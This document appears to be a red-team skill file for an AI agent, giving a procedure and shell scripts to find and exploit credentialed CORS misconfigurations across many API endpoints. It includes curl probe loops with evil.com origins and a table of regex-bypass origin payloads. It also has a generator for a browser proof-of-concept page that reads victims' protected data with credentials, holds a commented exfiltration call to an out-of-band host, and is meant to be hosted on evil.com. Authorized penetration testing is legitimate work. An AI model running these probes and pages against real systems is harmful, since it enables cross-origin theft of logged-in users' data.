---
name: cors-chain-automation
description: Use when a bounded list of authorized API endpoints needs consistent CORS triage before browser validation.
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [cors, automation, chain, redteam]
  category: redteam
---

# Multi-Endpoint CORS Triage

## When to Use

Use when you have a list of API endpoints or target domains and need to systematically find credential-exploitable CORS misconfigurations at scale. Distinguishes the 3 exploitable patterns (reflect-any-origin + credentials, null-origin trust, subdomain-regex bypass) from false positives (ACAO: * alone, ACAC without reflected origin, same-origin-only). Generates ready-to-use browser PoC HTML files for confirmed findings.

## Prerequisites

- Explicit authorization, target boundaries, and rate limits for the target.
- Tooling: `curl`, `gf`.
- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.

## How to Run

```bash
# Set once per engagement; every step below uses these.
TARGET="example.com"   # or the engagement target
export OUTPUT_DIR="${OUTPUT_DIR:-./output}"

# WRONG — tests only /users:
curl --max-time 30 --connect-timeout 10 -sk -I "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -i "access-control"

# CORRECT — test ALL endpoints:
for ep in /wp-json/wp/v2/users /wp-json/wp/v2/posts /wp-json/wp/v2/pages \
  /wp-json/wp/v2/media /wp-json/wp/v2/comments /wp-json/wp/v2/statuses \
  /wp-json/wp/v2/tags /wp-json/wp/v2/categories /wp-json/wp/v2/settings \
  /wp-json/wc/v3/products /wp-json/gf/v2/forms /wp-json/wp-site-health/v1; do
  cors=$(curl --max-time 30 --connect-timeout 10 -sk -I "https://$TARGET${ep}" -H "Origin: https://evil.com" 2>/dev/null | grep -iE "access-control-allow-origin|access-control-allow-credentials")
  code=$(curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" "https://$TARGET${ep}" -H "Origin: https://evil.com" 2>/dev/null)
  echo "${ep} — HTTP ${code} | ${cors:-NO CORS}"
done
```

## Procedure

The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.

## CORS Variations

| # | Variation | Initial signal | Required follow-up |
|---|-----------|----------------|--------------------|
| V1 | Origin reflection with credentials | Reflected origin and `ACAC: true` | Credentialed browser reads protected data |
| V2 | Null-origin trust | `ACAO: null` and `ACAC: true` | Sandboxed browser proof |
| V3 | Wildcard without credentials | `ACAO: *` | Determine whether the data is already public |
| V4 | Credentialed preflight | OPTIONS accepts origin and method | Actual browser request succeeds |
| V5 | Protected-route CORS | CORS appears on a 401 or 403 | Approved session returns protected data |
| V6 | Broad origin reflection | Several unrelated origins are reflected | Controlled-origin browser proof |
| V7 | Namespace-specific CORS | Only one API or plugin namespace reflects | Validate that namespace's data or action |
| V8 | Environment-specific CORS | Policies differ across environments | Demonstrate impact within scope |

### Critical Implementation Lesson — Test ALL Endpoints, Not Just /users

Do not infer policy for an entire application from one route. Test the bounded
set of endpoints supported by the application map:

```bash
# WRONG — tests only /users:
curl --max-time 30 --connect-timeout 10 -sk -I "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -i "access-control"

# CORRECT — test ALL endpoints:
for ep in /wp-json/wp/v2/users /wp-json/wp/v2/posts /wp-json/wp/v2/pages \
  /wp-json/wp/v2/media /wp-json/wp/v2/comments /wp-json/wp/v2/statuses \
  /wp-json/wp/v2/tags /wp-json/wp/v2/categories /wp-json/wp/v2/settings \
  /wp-json/wc/v3/products /wp-json/gf/v2/forms /wp-json/wp-site-health/v1; do
  cors=$(curl --max-time 30 --connect-timeout 10 -sk -I "https://$TARGET${ep}" -H "Origin: https://evil.com" 2>/dev/null | grep -iE "access-control-allow-origin|access-control-allow-credentials")
  code=$(curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" "https://$TARGET${ep}" -H "Origin: https://evil.com" 2>/dev/null)
  echo "${ep} — HTTP ${code} | ${cors:-NO CORS}"
done
```

Even endpoints returning 401/403 (auth required) still emit CORS headers — and if an admin is logged in, those 401s become 200s with sensitive data readable cross-origin.

### CORS on OPTIONS Preflight (V4)

Some sites only leak CORS headers on OPTIONS preflight, not on GET. Always test both:

```bash
curl --max-time 30 --connect-timeout 10 -sk -X OPTIONS "https://$TARGET/wp-json/wp/v2/users" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" | grep -iE "access-control"
```

### Null Origin Testing (V2)

Sandboxed iframes send `Origin: null`. Some sites whitelist it. Test explicitly:

```bash
curl --max-time 30 --connect-timeout 10 -sk -I "https://$TARGET/wp-json/wp/v2/users" -H "Origin: null" | grep -iE "access-control"
```

```bash
# Quick triage: probe 3 CORS patterns on a target
curl --max-time 30 --connect-timeout 10 -s -D - -o /dev/null "https://$TARGET/api/me" \
  -H "Origin: https://evil.com" \
  -H "Cookie: $COOKIE" | grep -i "access-control"

curl --max-time 30 --connect-timeout 10 -s -D - -o /dev/null "https://$TARGET/api/me" \
  -H "Origin: null" \
  -H "Cookie: $COOKIE" | grep -i "access-control"

# Multiple origins test
for origin in "https://evil.com" "https://eviltarget.com" "https://x.target.com.evil.com"; do
  echo "=== $origin ==="
  curl --max-time 30 --connect-timeout 10 -s -D - -o /dev/null "https://$TARGET/api/me" -H "Origin: $origin" -H "Cookie: $COOKIE" | grep -i "access-control"
done
```

## Step-by-Step

### Phase 1 — Endpoint Discovery
```bash
#!/bin/bash
# cors-endpoint-discovery.sh - Find CORS-emitting endpoints
TARGET="$1"
ENDPOINTS=(
  "/api/me" "/api/user" "/api/profile" "/api/session" "/api/tokens"
  "/api/csrf" "/api/account" "/api/settings" "/api/config"
  "/api/v1/me" "/api/v1/user" "/api/v1/profile"
  "/wp-json/wp/v2/users" "/wp-json/wp/v2/posts"
  "/graphql" "/v1/graphql"
  "/.well-known/openid-configuration"
)

for endpoint in "${ENDPOINTS[@]}"; do
  result=$(curl --max-time 30 --connect-timeout 10 -s -D - -o /dev/null "https://$TARGET$endpoint" \
    -H "Origin: https://evil.com" -H "Cookie: $COOKIE" 2>/dev/null | grep -i "access-control")
  [ -n "$result" ] && echo "=== $endpoint ===" && echo "$result"
done
```

### Phase 2 — Automated CORS Probe (3 patterns)
```bash
#!/bin/bash
# cors-probe.sh - Test 3 exploitable CORS patterns on each endpoint
TARGET="$1"
COOKIE="${2:-}"
PATTERNS=(
  "https://evil.com"
  "https://eviltarget.com"  
  "https://x.target.com.evil.com"
  "null"
)
RESULTS_FILE="/tmp/cors_results_${TARGET//\//_}.txt"

echo "CORS Probe Results for $TARGET" > "$RESULTS_FILE"
echo "Cookie: ${COOKIE:+present}" >> "$RESULTS_FILE"

for origin in "${PATTERNS[@]}"; do
  echo -e "\n--- Origin: $origin ---" >> "$RESULTS_FILE"
  
  # Test multiple endpoints
  for ep in /api/me /api/user /api/profile /api/session /api/tokens /api/csrf; do
    response=$(curl --max-time 30 --connect-timeout 10 -s -D - -o /dev/null "https://$TARGET$ep" \
      -H "Origin: $origin" ${COOKIE:+-H "Cookie: $COOKIE"} 2>/dev/null)
    
    acao=$(echo "$response" | grep -i "access-control-allow-origin" | tr -d '\r')
    acac=$(echo "$response" | grep -i "access-control-allow-credentials" | tr -d '\r')
    
    [ -n "$acao" ] && echo "  $ep → $acao | ${acac:-no ACAC}" >> "$RESULTS_FILE"
  done
done

echo "Results written to $RESULTS_FILE"
```

### Phase 3 — Subdomain Regex Bypass Classification
```bash
#!/bin/bash
# cors-regex-classifier.sh - Identify the EXACT regex flaw
# Usage: ./cors-regex-classifier.sh target.com

TARGET="$1"
ENDPOINT="/api/me"

# Test each bypass class
declare -A TESTS
TESTS["Standard-subdomain"]="https://evil.$TARGET"
TESTS["Missing-dot-separator"]="https://evil${TARGET}"  
TESTS["Missing-end-anchor"]="https://x.$TARGET.evil.com"
TESTS["Prefix-only"]="https://$TARGET.evil.com"
TESTS["Backtick-bypass"]="https://$TARGET%60.evil.com"
TESTS["Null-origin"]="null"

echo "=== CORS Regex Classification for $TARGET ==="
for test_name in "${!TESTS[@]}"; do
  origin="${TESTS[$test_name]}"
  result=$(curl --max-time 30 --connect-timeout 10 -s -D - -o /dev/null "https://$TARGET$ENDPOINT" \
    -H "Origin: $origin" -H "Cookie: $COOKIE" 2>/dev/null | grep -i "access-control-allow-origin")
  echo "[$test_name] Origin: $origin → ${result:-NO MATCH}"
done
```

### Phase 4 — Browser PoC Generation
```bash
#!/bin/bash
# cors-poc-generator.sh - Generate browser PoC HTML for confirmed findings
# Usage: ./cors-poc-generator.sh target.com /api/me "eyJhbGci..."

TARGET="$1"
ENDPOINT="$2"
SESSION_HINT="${3:-}"
DATE=$(date +%Y%m%d)
POC_FILE="poc-cors-${TARGET}-${DATE}.html"

cat > "$POC_FILE" << POCEOF
<!doctype html>
<html>
<head><title>CORS PoC — ${TARGET}${ENDPOINT}</title></head>
<body>
<h2>CORS Credential Read PoC</h2>
<p>Target: <code>https://${TARGET}${ENDPOINT}</code></p>
<p>Date: ${DATE}</p>
${SESSION_HINT:+<p>Session hint: <code>${SESSION_HINT}</code></p>}
<pre id="out">Loading...</pre>
<hr>
<h3>Results:</h3>
<script>
(async () => {
  const out = document.getElementById('out');
  const results = [];
  
  try {
    let r = await fetch('https://${TARGET}${ENDPOINT}', {credentials: 'include'});
    let d = await r.text();
    results.push('STATUS: ' + r.status);
    results.push('BODY: ' + d.substring(0, 500));
    
    // OOB exfil (uncomment for proof)
    // await fetch('https://OOB-ID.oastify.com/exfil?d=' + btoa(d));
  } catch(e) {
    results.push('BLOCKED: ' + e.message);
  }
  
  out.textContent = results.join('\\n');
  
  // Additional endpoints
  const extraEndpoints = ['/api/user', '/api/session', '/api/tokens'];
  for (const ep of extraEndpoints) {
    try {
      let r = await fetch('https://${TARGET}' + ep, {credentials: 'include'});
      let d = await r.text();
      results.push('--- ' + ep + ' ---');
      results.push('STATUS: ' + r.status);
      results.push('BODY: ' + d.substring(0, 300));
    } catch(e) {
      results.push('--- ' + ep + ' --- BLOCKED');
    }
  }
  out.textContent = results.join('\\n');
})();
</script>
</body>
</html>
POCEOF

echo "[+] PoC written to: $POC_FILE"
echo "    Host this on evil.com and visit while logged into $TARGET"
```

### Phase 5 — Bulk Cross-Referencing with Subdomain Takeover
```bash
#!/bin/bash
# cors-bulk-chainer.sh - Find targets where CORS + subdomain takeover chain
# Reads CORS results and subdomain takeover fingerprints, finds overlaps

CORS_RESULTS="$1"
SUB_RESULTS="$2"

echo "=== CORS + Subdomain Takeover Chain Candidates ==="
while read line; do
  target=$(echo "$line" | awk '{print $1}')
  cors_type=$(echo "$line" | awk '{print $2}')
  sub_status=$(grep "$target" "$SUB_RESULTS" 2>/dev/null | head -1)
  
  if [ -n "$sub_status" ]; then
    echo "[CHAIN] $target — CORS: $cors_type | Subdomain: $sub_status"
    echo "  -> If CORS trusts *.$target and a subdomain is takeoverable: Critical chain"
  fi
done < "$CORS_RESULTS"
```

## Pitfalls

- **Testing only /users endpoint** — the #1 CORS detection mistake. CORS credential reflection on WordPress affects ALL REST endpoints, not just users. Test `/wp/v2/users`, `/wp/v2/posts`, `/wp/v2/pages`, `/wp/v2/media`, and plugin-specific namespaces.
- **Confusing ACAO:* alone with exploitable CORS** — `Access-Control-Allow-Origin: *` without `Access-Control-Allow-Credentials: true` is safe. Only origin-reflection + credentials is exploitable.
- **Skipping OPTIONS preflight** — some sites only emit CORS headers on OPTIONS, not GET. Always test both methods.
- **Missing null-origin test** — sandboxed iframes send `Origin: null`. Some sites whitelist it. Test explicitly.
- **Single-origin test** — testing only `Origin: https://evil.com` misses multi-origin reflection patterns. Test at least 4 patterns: evil.com, subdomain bypass, null, and preflight.
- **Auth-required endpoints still leak** — even 401/403 responses can emit CORS headers. If an admin is logged in, those become 200s with cross-origin readable data.
- **Staging-only CORS not documented** — if CORS is only exploitable on staging, document this clearly. Production may have different controls.
- **Browser PoC without credentials:include** — the generated PoC must use `credentials: 'include'` or the browser won't send cookies and the attack won't work.
- **Shell loops for >5 endpoint iterations** — zsh array expansion can silently fail. Use Python for bulk CORS probing beyond 5 endpoints.

---

## Attack Surface Signals

- Endpoints returning `Access-Control-Allow-Origin` header
- Cookie-authenticated API endpoints (PII, tokens, CSRF tokens in response body)
- WordPress REST API endpoints (`/wp-json/wp/v2/users`, `/wp-json/wp/v2/posts`)
- SPAs with client-side API calls (Next.js, React, Vue)

## Reference Files

## Common Root Causes

1. **Reflect-any-origin with credentials** — server echoes `Origin` header and sets `ACAC: true`
2. **Null-origin trust** — server whitelists `null` origin, exploitable via sandboxed iframe
3. **Subdomain regex flaws** — unescaped dots, missing end-anchors, missing prefix dots
4. **Origin header completely missing from validation** — all origins accepted
5. **Pre-flight (OPTIONS) gating bypass** — OPTIONS allows arbitrary methods/headers

## Bypass Techniques

| Regex Flaw | Payload | Why | 
|---|---|---|
| Missing dot before domain | `https://eviltarget.com` | `.*target\\.com$` matches `eviltarget.com` |
| Missing end-anchor `$` | `https://x.target.com.evil.com` | regex matches prefix only |
| Unescaped dot (`.` = any char) | `https://xtargetXcom` | `.` matches any single char |
| Prefix-only (no `$`) | `https://target.com.evil.com` | matches start of string |
| Null trust | sandboxed iframe + `data:` URI | `Origin: null` sent automatically |

## Real Examples

From field recon across 58 companies:
- 5/7 deep targets had CORS credential reflection on WP REST API (reflect-any-origin + ACAC)
- All 5 allowed credentialed cross-origin read of user lists, post content, and media files
- CORS findings chained to subdomain takeover → full same-origin JS execution

## Verification

Run this self-test to confirm CORS probing works:

1. **Basic CORS probe** — test origin reflection on a known endpoint:
   ```bash
   curl --max-time 30 --connect-timeout 10 -s -D - -o /dev/null "https://httpbin.org/get" -H "Origin: https://evil.com" | grep -i "access-control"
   ```

2. **OPTIONS preflight test** — confirm preflight probing syntax:
   ```bash
   curl --max-time 30 --connect-timeout 10 -s -X OPTIONS "https://httpbin.org/get" -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -D - -o /dev/null | head -5
   ```

3. **Null origin test** — confirm null origin syntax:
   ```bash
   curl --max-time 30 --connect-timeout 10 -s -D - -o /dev/null "https://httpbin.org/get" -H "Origin: null" -w "HTTP %{http_code}
"
   ```

4. **PoC template integrity** — verify the browser PoC template is present:
   ```bash
   grep -q "credentials: 'include'" SKILL.md && echo "PASS: PoC template includes credentials" || echo "FAIL"
   grep -q "fetch(" SKILL.md && echo "PASS: fetch() PoC pattern present" || echo "FAIL"
   ```

All 4 tests verify the core CORS probing capability.

---

## Related Skills

- hunt-cors — underlying CORS hunting methodology
- hunt-subdomain — chain CORS + subdomain takeover for critical
- hunt-xss — browser PoC generation technique
- hunt-csrf — CORS pre-flight bypass chains to CSRF
- hunt-dom — postMessage origin checks relate to CORS origin checks
- hunt-wordpress — WP REST API is the most common CORS source
